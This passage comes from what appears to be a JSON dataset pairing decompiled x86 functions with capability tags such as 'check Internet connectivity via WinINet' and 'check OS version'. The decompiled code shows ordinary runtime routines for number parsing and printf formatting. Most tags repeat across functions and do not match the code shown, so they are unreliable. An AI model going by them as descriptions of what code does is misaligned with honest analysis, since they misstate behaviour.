*(unaff_EBP + -0x62) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar14 != 0)) {\n                    *pcVar13 = \"0123456789-+Ee\"[uVar7];\n                    pcVar13 = pcVar13 + 1;\n                    *(unaff_EBP + -0x7c) = iVar14 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.004047a5();\n                cVar3 = fcn.00401a9b(uVar16);\n            } while (cVar3 == '\\0');\n            *(unaff_EBP + -0x74) = pcVar13;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x50) == 0) {\n            *(unaff_EBP + -0x80) = 0;\n        }\n        else {\n            uVar7 = fcn.004017d0();\n            *(unaff_EBP + -0x80) = uVar7 & 0xffff;\n        }\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0xf;\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040654b(1, 0);\n        *(unaff_EBP + -4) = 4;\n        iVar14 = 0;\n        cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n        if (cVar3 != '\\0') {\n            uVar7 = *(unaff_EBP + -0x34);\n            pcVar15 = *(unaff_EBP + -0x48);\ncode_r0x0046e6a8:\n            do {\n                pcVar12 = *(unaff_EBP + -0x78);\n                while( true ) {\n                    if ((iVar14 == 0) || (cVar3 = *pcVar12,  *(unaff_EBP + -0x69) = cVar3,  cVar3 == '\\x7f'))\n                    goto code_r0x0046e6fd;\n                    iVar14 = iVar14 + -1;\n                    if (iVar14 != 0) {\n                        pcVar12 = unaff_EBP + -0x48;\n                        if (0xf < uVar7) {\n                            pcVar12 = pcVar15;\n                        }\n                        uVar7 = *(unaff_EBP + -0x34);\n                        if (*(unaff_EBP + -0x69) != pcVar12[iVar14]) goto code_r0x0046e6f9;\n                    }\n                    if (iVar14 == 0) {\n                        pcVar12 = unaff_EBP + -0x48;\n                        if (0xf < uVar7) {\n                            pcVar12 = pcVar15;\n                        }\n                        uVar7 = *(unaff_EBP + -0x34);\n                        if (*(unaff_EBP + -0x69) < *pcVar12) goto code_r0x0046e6f9;\n                    }\n                    pcVar12 = *(unaff_EBP + -0x78) + 1;\n                    if (*pcVar12 < '\\x01') break;\n                    *(unaff_EBP + -0x78) = pcVar12;\n                }\n            } while( true );\n        }\n        do {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00405c40();\n            }\n            uVar7 = fcn.00403710(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n            if (uVar7 < 10) {\n                iVar8 = *(unaff_EBP + -0x7c);\n                *(unaff_EBP + -0x61) = 1;\n                if (*(unaff_EBP + -0x98) == iVar8 || *(unaff_EBP + -0x98) < iVar8) {\n                    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x62) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *pcVar13 = \"0123456789-+Ee\"[uVar7];\n                    pcVar13 = pcVar13 + 1;\n                    *(unaff_EBP + -0x74) = pcVar13;\n                    *(unaff_EBP + -0x7c) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -0x48;\n                if (0xf < *(unaff_EBP + -0x34)) {\n                    iVar8 = *(unaff_EBP + -0x48);\n                }\n                if (*(iVar8 + iVar14) != '\\x7f') {\n                    iVar8 = unaff_EBP + -0x48;\n                    if (0xf < *(unaff_EBP + -0x34)) {\n                        iVar8 = *(unaff_EBP + -0x48);\n                    }\n                    *(iVar8 + iVar14) = *(iVar8 + iVar14) + '\\x01';\n                }\n            }\n            else {\n                uVar7 = *(unaff_EBP + -0x34);\n                pcVar15 = *(unaff_EBP + -0x48);\n                pcVar12 = unaff_EBP + -0x48;\n                if (0xf < uVar7) {\n                    pcVar12 = pcVar15;\n                }\n                if ((pcVar12[iVar14] == '\\0') || (*(unaff_EBP + -0x80) == 0)) goto code_r0x0046e68b;\n                iVar11 = *(arg_10h_00 + 6);\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405c40();\n                    iVar11 = *(arg_10h_00 + 6);\n                    uVar7 = *(unaff_EBP + -0x34);\n                    pcVar15 = *(unaff_EBP + -0x48);\n                }\n                if (iVar11 != *(unaff_EBP + -0x80)) goto code_r0x0046e68b;\n                fcn.00404476(0);\n                iVar14 = iVar14 + 1;\n            }\n            fcn.004047a5();\n            cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n        } while (cVar3 == '\\0');\n        uVar7 = *(unaff_EBP + -0x34);\n        pcVar15 = *(unaff_EBP + -0x48);\ncode_r0x0046e68b:\n        if (iVar14 == 0) goto code_r0x0046e6a8;\n        pcVar12 = unaff_EBP + -0x48;\n        if (0xf < uVar7) {\n            pcVar12 = pcVar15;\n        }\n        if ('\\0' < pcVar12[iVar14]) {\n            iVar14 = iVar14 + 1;\n            goto code_r0x0046e6a8;\n        }\ncode_r0x0046e6f9:\n        *(unaff_EBP + -99) = 1;\ncode_r0x0046e6fd:\n        *(unaff_EBP + -4) = 1;\n        if (0xf < uVar7) {\n            *(unaff_EBP + -0x78) = pcVar15;\n            *(unaff_EBP + -0x80) = uVar7 + 1;\n            if (0xfff < uVar7 + 1) {\n                fcn.00404070(unaff_EBP + -0x78, unaff_EBP + -0x80);\n                pcVar15 = *(unaff_EBP + -0x78);\n            }\n            fcn.00401a32(pcVar15);\n        }\n        uVar16 = *(unaff_EBP + -0x68);\n    }\n    cVar3 = fcn.00401a9b(0x46e73e);\n    if (cVar3 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        iVar11 = *(arg_10h_00 + 6);\n        iVar4 = fcn.00406104();\n        if (iVar11 == iVar4) {\n            puVar9 = fcn.00401366();\n            puVar6 = *(unaff_EBP + -0x74);\n            *puVar6 = **puVar9;\n            pcVar13 = puVar6 + 1;\n            *(unaff_EBP + -0x74) = pcVar13;\n            fcn.004047a5();\n        }\n        else {\n            pcVar13 = *(unaff_EBP + -0x74);\n        }\n    }\n    if ((**(unaff_EBP + -0x90) != 1000000000) && (*(unaff_EBP + -0x7c) == 0)) {\n        cVar3 = fcn.00401a9b(uVar16);\n        if (cVar3 == '\\0') {\n            iVar14 = *(unaff_EBP + -0x70);\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405c40();\n                }\n                if (*(arg_10h_00 + 6) != *(unaff_EBP + -0x30)) break;\n                *(unaff_EBP + -0x61) = 1;\n                iVar14 = iVar14 + -1;\n                fcn.004047a5();\n                cVar3 = fcn.00401a9b(uVar16);\n            } while (cVar3 == '\\0');\n            *(unaff_EBP + -0x70) = iVar14;\n            pcVar13 = *(unaff_EBP + -0x74);\n        }\n        iVar14 = *(unaff_EBP + -0x70);\n        if (iVar14 < 0) {\n            *pcVar13 = '0';\n            pcVar13 = pcVar13 + 1;\n            *(unaff_EBP + -0x70) = iVar14 + 1;\n        }\n    }\n    while (cVar3 = fcn.00401a9b(uVar16),  cVar3 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        uVar7 = fcn.00403710(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n        if (9 < uVar7) break;\n        iVar14 = *(unaff_EBP + -0x7c);\n        if (iVar14 < *(unaff_EBP + -0x98)) {\n            *pcVar13 = \"0123456789-+Ee\"[uVar7];\n            pcVar13 = pcVar13 + 1;\n            *(unaff_EBP + -0x7c) = iVar14 + 1;\n        }\n        else if (uVar7 != 0) {\n            *(unaff_EBP + -0x62) = 1;\n        }\n        *(unaff_EBP + -0x61) = 1;\n        fcn.004047a5();\n    }\n    pcVar15 = pcVar13;\n    if (*(unaff_EBP + -0x62) != '\\0') {\n        while (pcVar15 = pcVar15 + -1,  pcVar15 != *(unaff_EBP + -0x88)) {\n            *(unaff_EBP + -0x90) = pcVar15;\n            ppcVar10 = fcn.00401366();\n            cVar3 = *pcVar15;\n            if (cVar3 != **ppcVar10) {\n                if (cVar3 != '9') {\n                    pcVar12 = *(unaff_EBP + -0x90);\n                    *pcVar15 = cVar3 + '\\x01';\n                    pcVar15 = pcVar12;\n                    if (pcVar12 != *(unaff_EBP + -0x88)) goto code_r0x0046e919;\n                    break;\n                }\n                *pcVar15 = '0';\n            }\n        }\n        *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 1;\n        *pcVar15 = '1';\ncode_r0x0046e919:\n        uVar16 = *(unaff_EBP + -0x68);\n    }\n    cVar3 = *(unaff_EBP + -0x61);\n    pcVar15 = pcVar13;\n    if (cVar3 != '\\0') {\n        cVar3 = fcn.00401a9b(uVar16);\n        if (cVar3 == '\\0') {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00405c40();\n            }\n            iVar11 = *(arg_10h_00 + 6);\n            if (iVar11 != *(unaff_EBP + -0x16)) {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405c40();\n                    iVar11 = *(arg_10h_00 + 6);\n                }\n                if (iVar11 != *(unaff_EBP + -0x18)) goto code_r0x0046ea60;\n            }\n            *pcVar13 = 'e';\n            pcVar15 = pcVar13 + 1;\n            fcn.004047a5();\n            *(unaff_EBP + -0x61) = 0;\n            iVar14 = 0;\n            cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n            if (cVar3 == '\\0') {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405c40();\n                }\n                iVar11 = *(arg_10h_00 + 6);\n                if (iVar11 == *(unaff_EBP + -0x1a)) {\n                    *pcVar15 = '+';\n                }\n                else {\n                    if (*(arg_10h_00 + 4) == '\\0') {\n                        fcn.00405c40();\n                        iVar11 = *(arg_10h_00 + 6);\n                    }\n                    if (iVar11 != *(unaff_EBP + -0x1c)) goto code_r0x0046e9c4;\n                    *pcVar15 = '-';\n                }\n                pcVar15 = pcVar13 + 2;\n                fcn.004047a5();\n            }\ncode_r0x0046e9c4:\n            cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n            if (cVar3 == '\\0') {\n                do {\n                    cVar1 = *(arg_10h_00 + 4);\n                    cVar3 = *(unaff_EBP + -0x61);\n                    *(unaff_EBP + -0x61) = cVar3;\n                    if (cVar1 == '\\0') {\n                        fcn.00405c40();\n                        cVar3 = *(unaff_EBP + -0x61);\n                    }\n                    if (*(arg_10h_00 + 6) != *(unaff_EBP + -0x30)) {\n                        if (cVar3 == '\\0') goto code_r0x0046ea15;\n                        break;\n                    }\n                    *(unaff_EBP + -0x61) = 1;\n                    fcn.004047a5();\n                    cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n                } while (cVar3 == '\\0');\n                *pcVar15 = '0';\n                pcVar15 = pcVar15 + 1;\n            }\ncode_r0x0046ea15:\n            do {\n                cVar3 = fcn.00401a9b(*(unaff_EBP + -0x68));\n                if (cVar3 != '\\0') break;\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405c40();\n                }\n                uVar7 = fcn.00403710(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n                if (9 < uVar7) break;\n                if (iVar14 < 8) {\n                    *pcVar15 = \"0123456789-+Ee\"[uVar7];\n                    pcVar15 = pcVar15 + 1;\n                    iVar14 = iVar14 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.004047a5();\n            } while( true );\n        }\ncode_r0x0046ea60:\n        cVar3 = *(unaff_EBP + -0x61);\n    }\n    if ((*(unaff_EBP + -99) != '\\0') || (cVar3 == '\\0')) {\n        pcVar15 = *(unaff_EBP + -0x84);\n    }\n    *pcVar15 = '\\0';\n    fcn.004029b9();\ncode_r0x0046ea81:\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 5639
    },
    "00405650": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405650(uint32_t *param_1)\n\n{\n    uint32_t *arg_8h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iStack20;\n    uint uStack16;\n    ushort uStack12;\n    uint16_t *puStack8;\n    \n    uVar9 = *(param_1 + 0x32);\n    puStack8 = uVar9;\n    if (puStack8 != 0x46) {\n        if (puStack8 == 0x4e) {\n            puStack8 = *param_1 & 8;\n            if (puStack8 != NULL) goto code_r0x0049dbb2;\n            param_1[7] = 8;\ncode_r0x0049da7d:\n            puStack8 = 0x49da82;\n            puVar6 = fcn.004039a4();\n            *puVar6 = 0x16;\n            puStack8 = 0x49da8d;\n            uVar7 = fcn.00403751();\n            return uVar7 & 0xffffff00;\n        }\n        if (param_1[0xb] != 0) goto code_r0x0049da7d;\n        if (uVar9 < 0x6b) {\n            if (uVar9 == 0x6a) {\n                param_1[0xb] = 5;\n                goto code_r0x0049dbb2;\n            }\n            if (puStack8 == 0x49) {\n                puVar2 = param_1[4];\n                puStack8 = *puVar2;\n                if ((puStack8 == 0x33) && (puVar2[1] == 0x32)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 10;\n                    param_1[4] = puStack8;\n                }\n                else if ((puStack8 == 0x36) && (puVar2[1] == 0x34)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 0xb;\n                    param_1[4] = puStack8;\n                }\n                else if (((((puStack8 == 0x64) || (puStack8 == 0x69)) || (puStack8 == 0x6f)) ||\n                         ((puStack8 == 0x75 || (puStack8 == 0x78)))) || (puStack8 == 0x58)) {\n                    param_1[0xb] = 9;\n                }\n                goto code_r0x0049dbb2;\n            }\n            if (puStack8 == 0x4c) {\n                param_1[0xb] = 8;\n                goto code_r0x0049dbb2;\n            }\n            if (puStack8 == 0x54) {\n                param_1[0xb] = 0xd;\n                goto code_r0x0049dbb2;\n            }\n            if (uVar9 != 0x68) goto code_r0x0049dbb2;\n            if (*param_1[4] == 0x68) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x1;\n            }\n            else {\n                puStack8 = 0x2;\n            }\n        }\n        else {\n            if (uVar9 != 0x6c) {\n                if (puStack8 == 0x74) {\n                    param_1[0xb] = 7;\n                }\n                else if (puStack8 == 0x77) {\n                    param_1[0xb] = 0xc;\n                }\n                else if (puStack8 == 0x7a) {\n                    param_1[0xb] = 6;\n                }\n                goto code_r0x0049dbb2;\n            }\n            if (*param_1[4] == 0x6c) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x4;\n            }\n            else {\n                puStack8 = 0x3;\n            }\n        }\n        param_1[0xb] = puStack8;\ncode_r0x0049dbb2:\n        return CONCAT31(puStack8 >> 8, 1);\n    }\n    puStack8 = *param_1 & 8;\n    if (puStack8 != NULL) goto code_r0x0049dbb2;\n    param_1[7] = 7;\n    puStack8 = *0x56cca8 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x0049f8ea:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0049f8ee:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x0049f8f1:\n            cVar5 = fcn.004068a7(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0049f896:\n                arg_8h_00 = 0x10;\n                goto code_r0x0049f8f1;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x0049f8aa;\n                if (uVar9 < 0x45) goto code_r0x0049fa7a;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x0049fa7a;\n                    goto code_r0x0049f87e;\n                }\n            }\ncode_r0x0049f8fa:\n            cVar5 = fcn.00406730();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.00406136();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x0049f8fa;\n            if (uVar9 != 99) goto code_r0x0049fa7a;\ncode_r0x0049f8aa:\n            cVar5 = fcn.0040101e(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.00406640();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x0049f8fa;\n            if (uVar9 == 0x69) goto code_r0x0049f8ea;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.0040201d();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x0049fa7a;\n                cVar5 = fcn.004028ba();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x0049fa7a;\n                arg_ch_00 = 0;\n                goto code_r0x0049f896;\n            }\n            goto code_r0x0049f8ee;\n        }\ncode_r0x0049f87e:\n        cVar5 = fcn.00402d4c();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0xc) != '\\0')) goto code_r0x0049fa7a;\n    arg_ch = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uVar7 = param_1[8];\n    iStack20 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                    iStack20 = 1;\n                }\n                goto code_r0x0049f985;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        iStack20 = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049f985:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&stack0xfffffff0 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar8 = 0x78,  iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&stack0xfffffff2 + arg_ch * 2) = uVar8;\n        arg_ch = arg_ch + 2;\n        iStack20 = arg_ch;\n    }\n    arg_8h = param_1 + 0x112;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00405afb(arg_8h, 0x20, arg_10h, param_1 + 6);\n        arg_ch = iStack20;\n    }\n    fcn.00404043(&stack0xfffffff0, arg_ch, param_1 + 6, param_1 + 3);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00405afb(arg_8h, 0x30, arg_10h, param_1 + 6);\n    }\n    fcn.00402fc7(0);\n    if ((-1 < param_1[6]) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00405afb(arg_8h, 0x20, arg_10h, param_1 + 6);\n    }\ncode_r0x0049fa7a:\n    uVar7 = fcn.00403085(unaff_ESI);\n    return uVar7;\n}\n",
        "token_count": 2654
    },
    "004056aa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004056aa(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    int16_t *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x28) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.00403607(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == 0x24)) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.00405eed(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x32), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        *(param_1 + 0x28) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 440
    },
    "004056cd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004056cd(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t arg_8h_00;\n    char *pcVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401212(&var_ch);\n    if ((var_8h == '\\0') && (*0x56f46c != 0)) {\n        pcVar3 = *0x56f45c;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        uVar4 = pcVar3 - (*0x56f45c + 1);\n        if (*0x56f46c < uVar4) {\n            puVar5 = &var_4h;\n            var_4h = 0x682424;\n            do {\n                cVar1 = *puVar5;\n                puVar5 = puVar5 + 1;\n            } while (cVar1 != '\\0');\n            iVar6 = puVar5 - (&var_4h + 1);\n            iVar2 = fcn.00406771(*0x56f45c + *0x56f46c, &var_4h, iVar6);\n            if ((iVar2 != 0) && (arg_8h_00 = uVar4 + 1 + iVar6,  uVar4 <= arg_8h_00)) {\n                if (arg_8h == 0) {\n                    arg_8h = fcn.004065fa(arg_8h_00);\n                    if (arg_8h != 0) goto code_r0x0048c1a5;\n                }\n                else if (arg_8h_00 < arg_ch) {\ncode_r0x0048c1a5:\n                    fcn.0040576d(arg_8h, *0x56f45c, *0x56f46c);\n                    fcn.0040576d(*0x56f46c + arg_8h, &var_4h, iVar6);\n                    fcn.0040576d(*0x56f46c + iVar6 + arg_8h, *0x56f45c + *0x56f46c, (uVar4 - *0x56f46c) + 1);\n                    return arg_8h;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 600
    },
    "004056ff": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004056ff(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.00401190(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 350
    },
    "00405745": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405745(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    \n    if (((*in_ECX != 9) && (*arg_8h != 0)) && (piVar1 = fcn.004051dc(8),  piVar1 != NULL)) {\n        *piVar1 = *arg_8h;\n        piVar1[1] = arg_8h[1];\n        *in_ECX = *in_ECX + 1;\n        in_ECX[*in_ECX + 1] = piVar1;\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00405786": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl\nfcn.00405786(uchar *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uchar *var_44h;\n    int32_t var_40h;\n    uchar *var_3ch;\n    int32_t var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004057e5(arg_1ch);\n    uVar4 = 0;\n    var_4h = *(var_10h + 0x14);\n    if ((((arg_8h == NULL) || (arg_ch == 0)) || (*arg_8h = 0,  arg_10h == 0)) || (arg_14h == 0)) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        var_2ch = 0;\n        var_28h = 0;\n        var_24h = 0;\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h._0_1_ = '\\0';\n        iVar2 = fcn.00404e62(arg_10h, &var_2ch, var_4h);\n        if (iVar2 == 0) {\n            iVar2 = fcn.00403ff3(arg_ch * 2);\n            if (iVar2 != 0) {\n                iVar3 = fcn.00404593(iVar2, arg_ch, var_24h, arg_14h, arg_18h, arg_1ch);\n                if (iVar3 != 0) {\n                    var_44h = arg_8h;\n                    var_3ch = arg_8h;\n                    var_40h = arg_ch;\n                    var_38h = arg_ch;\n                    var_34h = 0;\n                    var_30h._0_1_ = 0;\n                    iVar3 = fcn.004050fb(iVar2, &var_44h, var_4h);\n                    uVar4 = ~-(iVar3 != 0) & var_34h;\n                }\n            }\n            fcn.00406302(iVar2);\n        }\n        if (var_18h != '\\0') {\n            fcn.00406302(var_24h);\n        }\n    }\n    if (var_8h != '\\0') {\n        *(var_14h + 0x350) = *(var_14h + 0x350) & 0xfffffffd;\n    }\n    return uVar4;\n}\n",
        "token_count": 715
    },
    "0040579a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040579a(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        uVar3 = *(*(in_ECX + 0x14) + -8);\n        arg_8h[1] = *(*(in_ECX + 0x14) + -4);\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00403819(in_ECX + 0x464 + uVar1 * 0x10, 4, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        puVar2 = *(in_ECX + 0x46c + uVar1 * 0x10);\n        uVar3 = puVar2[1];\n        *arg_8h = *puVar2;\n        arg_8h[1] = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 364
    },
    "0040579f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
